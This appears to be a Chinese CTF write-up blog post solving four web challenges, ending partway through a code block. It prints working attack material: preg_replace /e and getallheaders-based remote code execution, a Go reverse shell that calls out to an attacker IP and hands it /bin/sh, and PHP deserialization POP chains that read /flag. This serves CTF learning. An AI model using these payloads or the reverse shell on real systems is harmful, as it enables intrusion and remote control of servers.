        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_61839115/article/details/131117164">参考文章</a></p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a><strong>ezrce</strong></h2><p>但是只做出了这道题目</p><p><strong>和那个GXYCTF的禁止套娃差不多</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你是谁啊哥们？把钥匙给我！！！！&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$qaq</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qaq&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$name</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你是&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;大人????&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$name1</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/hahaha/e&#x27;</span>,<span class="variable">$qaq</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;骗我的吧，你明明是    &gt;&gt;&gt;&gt;小小&quot;</span>.<span class="variable">$name1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这就是题目的关键代码了</p><p>这个代码里的正则是关键<code>/hahaha/e</code></p><p>在PHP中，<code>/e</code>是一个正则表达式修饰符，它用于将替换字符串作为可执行的PHP代码进行解释。</p><p><img src="../images/image-20230611150837568.png" alt="image-20230611150837568"></p><p>这里的得到了当前目录下的代码，当我们尝试别的命令执行的时候，发现执行失败，应该是过滤了很多东西了</p><p>这里的话我们就尝试读取一下这个<code>waf.php</code>    </p><p><code>file_get_contents(array_pop(scandir(pos(localeconv()))))</code>利用这个代码读取了·<code>waf.php</code>  这个代码是读取最后一个文件的 当然了<code>index.php</code>也能读取 稍微修改一下这个代码就行了</p><p><strong>waf.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$poc</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|get_defined_vars|getallheaders|next|prev|end|array_reverse|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$poc</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker! you die!&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>几乎过滤掉了所有东西，只能通过函数方法来进行执行</p><p>这里的话参考(禁止套娃)得到了灵感</p><p><img src="../images/image-20230611151932869.png" alt="image-20230611151932869"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()))</span><br></pre></td></tr></table></figure><p>然后cookie传参就行了 ———&gt;  <code>PHPSESSID=/flag</code></p><p>当然还有另一种方法是我看waf.php里面得出的灵感   就是利用这个函数<code>getallheaders</code></p><p><img src="../images/image-20230611152444467.png" alt="image-20230611152444467"></p><p>就是需要改图片中这几处就行了   <code>PHPSESSID=eval(next(getallheaders()))</code>这个为什么能行了，打印一下<code>getallheaders()</code>这个函数就行了，next的时候就会指向UA头，所以说我们只要控制UA头就能RCE了</p><p><strong>两种方法的区别是</strong></p><ul><li><strong>第一种只能读文件，而且只能猜flag名字</strong></li><li><strong>第二种是能进行rce，能为所欲为</strong></li></ul><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>这道题考察的是go的反弹shell</p><p><img src="../images/image-20230611153330503.png" alt="image-20230611153330503"></p><p>这个玩意没啥用</p><p>查看源码 发现有个路径  </p><p><img src="../images/image-20230611153352953.png" alt="image-20230611153352953"></p><p><img src="../images/image-20230611153437952.png" alt="image-20230611153437952"></p><p>访问后是这样，我们把<code>index</code>改成<code>admin</code>的话</p><p><img src="../images/image-20230611153525037.png" alt="image-20230611153525037"></p><p>得到了用户名和一段编码过的密码  于是尝试破解</p><p><img src="../images/image-20230611153632000.png" alt="image-20230611153632000"></p><p>然后登录</p><p><img src="../images/image-20230611153744386.png" alt="image-20230611153744386"></p><p>让我们上传一个go文件，然后它会帮我们运行</p><p>那么我们就去网上找一个由go的反弹shell的文件，然后拿来上传</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 连接到攻击者的 IP 地址和端口</span></span><br><span class="line">    conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;your_ip:9996&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将连接交给 Cmd 对象处理</span></span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">    cmd.Stdin = conn</span><br><span class="line">    cmd.Stdout = conn</span><br><span class="line">    cmd.Stderr = conn</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动 Cmd 对象</span></span><br><span class="line">    err = cmd.Start()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待 Cmd 对象执行完毕</span></span><br><span class="line">    err = cmd.Wait()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    conn.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出完成信息</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Shell session terminated&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(<strong>因为这里没有上传入口，所以我们得自己写一个html来强制上传</strong>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://d5e624ee.clsadp.com/Adm1nUp104d&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230611154326187.png" alt="image-20230611154326187"></p><p>成功</p><p><strong>总结</strong></p><ul><li>这题的看起来其实不难，难点是在能想到把<code>index</code>改成<code>admin</code>   并且不执著于页面的那个登录框</li></ul><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p><img src="../images/image-20230611155817651.png" alt="image-20230611155817651"></p><p>这里的话先查看源码</p><p><img src="../images/image-20230611155851957.png" alt="image-20230611155851957"></p><p>访问得到</p><p><img src="../images/image-20230611155914604.png" alt="image-20230611155914604"></p><p>接着访问</p><p><img src="../images/image-20230611155943182.png" alt="image-20230611155943182"></p><p>进行base64解码得到</p><p><img src="../images/image-20230611155959067.png" alt="image-20230611155959067"></p><p>然后访问之后拿到题目给的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">night</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$night</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;night . <span class="string">&#x27;哒咩哟&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">day</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$day</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;day-&gt;<span class="title function_ invoke__">go</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;day-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">light</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$light</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;light-&gt;<span class="title function_ invoke__">d</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dark</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;dark)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="title function_ invoke__">hacked</span>(<span class="variable">$this</span>-&gt;dark));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hacked</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="number">0</span>,<span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;呆jio步&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\.\.*/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$s</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$un</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;‮⁦快给我传参⁩⁦pop&#x27;</span>]); <span class="comment">// </span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;seino&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;dark=<span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;day=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">light</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;light=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;dark=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;day=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="keyword">new</span> <span class="title function_ invoke__">night</span>();</span><br><span class="line"><span class="variable">$n</span>-&gt;night=<span class="variable">$e</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;night&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;night&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;day&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;day&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;dark&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;dark&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;light&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;light&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;day&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;day&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;dark&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;dark&quot;</span>;s:<span class="number">49</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;&#125;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话其实pop链不难构造，难的是怎么进行命令执行，当时卡了半天没成功</p><p>(<strong>这里的dark参数要传不同的值得序列化两边，并且使用不同的名字</strong>)</p><p>还有就是这里的post传参的话是有不可见字符的(<strong>复制进sublime就能看见了</strong>)</p><p><img src="../images/image-20230611172413530.png" alt="image-20230611172413530"></p><p>传参进行url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%E2%80%AE%E2%81%A6%E5%BF%AB%E7%BB%99%E6%88%91%E4%BC%A0%E5%8F%82%E2%81%A9%E2%81%A6pop</span><br></pre></td></tr></table></figure><p>因为这里抛出了一个异常，导致destruct方法没有被触发，</p><p>我们可以使用 <code>fast destruct</code>技巧提前触发 <code>__destruct()</code></p><p>这里我们可以删除最后一个大括号 <code>&#125;</code>：得到flag的base64编码</p><p><img src="../images/image-20230611172744069.png" alt="image-20230611172744069"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本质上，fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的__destruct(),提前触发反序列化链条。</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/APPPQRS/p/16862351.html">fast destruct 详解</a></p><p><a href="https://zhuanlan.zhihu.com/p/405838002">PHP序列化冷知识</a>     ——-&gt;    这篇文章可以好好看看</p><p>这里的话还有另一种解法就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">night</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night=<span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night-&gt;day=<span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night-&gt;day-&gt;dark=<span class="keyword">new</span> <span class="title function_ invoke__">light</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night-&gt;day-&gt;dark-&gt;light=<span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night-&gt;day-&gt;dark-&gt;light-&gt;day=<span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night-&gt;day-&gt;dark-&gt;light-&gt;day-&gt;dark=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">array</span>(<span class="variable">$t</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure><p><strong>把实例化后的night放入到数组里在进行实例化 </strong>    这样也可以进行绕过</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>访问直接给了代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password==<span class="string">&quot;‮⁦  //how to change the private variables⁩⁦secret&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230611175801822.png" alt="image-20230611175801822"></p><p>这里的给的php太低，如果给高的话，可以直接修改源码里的private</p><p>好像是php7以上就可以来着</p><p><img src="../images/image-20230611180105554.png" alt="image-20230611180105554"></p><p>给了个提示</p><p><img src="../images/image-20230611180122824.png" alt="image-20230611180122824"></p><p>这些东西就是反射的东西，学过java反射的话应该对这个很熟悉</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> <span class="title function_ invoke__">getFlag</span>();</span><br><span class="line"><span class="variable">$refl</span> = <span class="keyword">new</span> <span class="title class_">ReflectionObject</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$pwd</span> = <span class="variable">$refl</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="variable">$pwd</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$pwd</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$flag</span>,<span class="string">&quot;%E2%80%AE%E2%81%A6%20%20%2F%2Fhow%20to%20change%20the%20private%20variables%E2%81%A9%E2%81%A6secret&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$refl</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$cmd</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span 